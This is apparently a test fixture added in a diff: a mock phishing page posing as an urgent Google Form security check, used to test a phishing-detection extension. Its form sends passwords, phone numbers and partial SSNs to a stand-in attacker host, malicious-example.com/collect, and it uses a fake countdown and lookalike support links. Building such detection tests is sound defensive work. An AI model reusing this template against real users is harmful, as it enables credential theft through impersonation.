@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Form - Important Security Survey</title>
+    <style>
+        body {
+            font-family: 'Google Sans', Arial, sans-serif;
+            background-color: #f8f9fa;
+            margin: 0;
+            padding: 20px;
+        }
+        .form-container {
+            max-width: 640px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+            overflow: hidden;
+        }
+        .form-header {
+            background: #673ab7;
+            color: white;
+            padding: 24px;
+        }
+        .form-title {
+            font-size: 32px;
+            font-weight: 400;
+            margin: 0 0 8px 0;
+        }
+        .form-description {
+            font-size: 14px;
+            opacity: 0.9;
+            margin: 0;
+        }
+        .form-content {
+            padding: 24px;
+        }
+        .question {
+            margin-bottom: 24px;
+        }
+        .question-title {
+            font-size: 16px;
+            font-weight: 400;
+            margin-bottom: 8px;
+            color: #202124;
+        }
+        .question-input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+        .question-input:focus {
+            border-color: #4285f4;
+            outline: none;
+        }
+        .submit-btn {
+            background: #4285f4;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            font-weight: 500;
+        }
+        .submit-btn:hover {
+            background: #3367d6;
+        }
+        .google-logo {
+            display: inline-block;
+            margin-bottom: 16px;
+        }
+        .urgent-notice {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            padding: 16px;
+            margin-bottom: 24px;
+            border-radius: 4px;
+            color: #856404;
+        }
+        .suspicious-link {
+            color: #dc3545;
+            text-decoration: underline;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <div class="form-header">
+            <div class="google-logo">
+                <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNzQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCA3NCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTkuMjQgOGgtMi4ydjEuNjhoNC4yNmMtLjEgMS4wNC0uNTMgMS45My0xLjEgMi42M3YyLjE3aDIuMzNjMS4wNi0uOTggMS42OS0yLjQyIDEuNjktNC4xMiAwLS4zNS0uMDMtLjY5LS4wOS0xLjAzeiIgZmlsbD0iI0ZGRkZGRiIvPgo8cGF0aCBkPSJNNi4xMyAxNC4yNWMtLjQzIDAtLjg0LS4wNy0xLjIzLS4yMWwtLjI3IDEuMDljLjUxLjI1IDEuMDkuMzkgMS43LjM5IDEuNzEgMCAzLjE4LS41NyA0LjI0LTEuNTRsLTIuMDctMS42Yy0uNTYuMzctMS4yNy41OS0yLjA3LjU5eiIgZmlsbD0iI0ZGRkZGRiIvPgo8L3N2Zz4K" alt="Google" width="74" height="24">
+            </div>
+            <h1 class="form-title">🚨 URGENT: Account Security Verification</h1>
+            <p class="form-description">Google Form - Immediate action required to secure your account</p>
+        </div>
+        
+        <div class="form-content">
+            <div class="urgent-notice">
+                <strong>⚠️ SECURITY ALERT:</strong> Suspicious activity detected on your account. 
+                Please verify your information immediately to prevent account suspension.
+                <br><br>
+                <strong>Time remaining:</strong> 15 minutes
+                <br>
+                <strong>Reference ID:</strong> SEC-2024-9876543
+            </div>
+            
+            <!-- This form action points to a non-Google domain - SUSPICIOUS! -->
+            <form action="https://malicious-example.com/collect" method="POST">
+                <div class="question">
+                    <div class="question-title">Full Name *</div>
+                    <input type="text" name="fullname" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Email Address *</div>
+                    <input type="email" name="email" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Password (for verification) *</div>
+                    <input type="password" name="password" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Phone Number *</div>
+                    <input type="tel" name="phone" class="question-input" required>
+                </div>
+                
+                <div class="question">
+                    <div class="question-title">Social Security Number (last 4 digits) *</div>
+                    <input type="text" name="ssn" class="question-input" maxlength="4" required>
+                </div>
+                
+                <button type="submit" class="submit-btn">🔒 Secure My Account Now</button>
+            </form>
+            
+            <div style="margin-top: 24px; padding-top: 24px; border-top: 1px solid #dadce0; font-size: 12px; color: #666;">
+                <p>If you're having trouble, please contact our support team immediately:</p>
+                <ul>
+                    <li>Emergency Support: <a href="http://192.0.2.1/steal" class="suspicious-link">http://192.0.2.1/steal</a></li>
+                    <li>Live Chat: <a href="https://fake-google-support.malicious-site.com" class="suspicious-link">https://fake-google-support.malicious-site.com</a></li>
+                    <li>Phone: <a href="tel:+1-555-SCAM-123" class="suspicious-link">+1-555-SCAM-123</a></li>
+                </ul>
+                <p><small>This form expires in 15 minutes. Do not share this link with anyone.</small></p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Fake countdown timer to create urgency
+        let timeLeft = 15 * 60; // 15 minutes in seconds
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            const timerText = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            // Update any timer displays
+            const urgentNotice = document.querySelector('.urgent-notice');
+            if (urgentNotice) {
+                urgentNotice.innerHTML = urgentNotice.innerHTML.replace(
+                    /Time remaining:<\/strong> \d+:\d+/,
+                    `Time remaining:</strong> ${timerText}`
+                );
+            }
+            
+            timeLeft--;
+            if (timeLeft >= 0) {
+                setTimeout(updateTimer, 1000);
+            }
+        }
+        
+        // Start the fake timer
+        setTimeout(updateTimer, 1000);
+        
+        // Simulate form submission (this would normally steal data)
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            alert('⚠️ PHISHING ATTEMPT BLOCKED!\n\nThis form was trying to steal your personal information.\nThe extension detected this as a phishing attempt.');
+        });
+    </script>
+</body>
+</html>
